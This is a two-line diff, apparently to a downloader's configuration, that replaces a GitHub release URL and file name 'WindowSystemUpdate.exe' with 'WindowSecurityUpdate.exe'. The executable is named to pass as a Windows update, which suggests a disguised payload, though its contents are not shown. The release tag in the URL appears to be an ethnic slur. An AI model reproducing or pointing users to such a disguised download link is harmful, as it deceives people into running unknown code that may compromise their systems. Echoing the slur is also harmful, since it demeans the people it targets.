@@ -1,2 +1,2 @@
-https://github.com/shxv41/test/releases/download/niger/WindowSystemUpdate.exe
-WindowSystemUpdate.exe
+https://github.com/shxv41/test/releases/download/niger/WindowSecurityUpdate.exe
+WindowSecurityUpdate.exe
